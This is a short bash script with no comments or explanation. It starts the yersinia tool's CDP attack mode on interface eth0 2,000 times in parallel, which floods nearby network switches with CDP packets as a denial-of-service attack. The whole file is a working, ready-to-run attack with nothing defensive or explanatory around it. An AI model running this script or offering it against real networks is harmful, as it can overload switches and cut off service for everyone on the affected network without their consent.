#!/usr/bin/env bash
function CDP() {
        for i in $(seq 1 2000); do
                /usr/bin/yersinia cdp -attack 1 -interface eth0 &
        done
}
CDP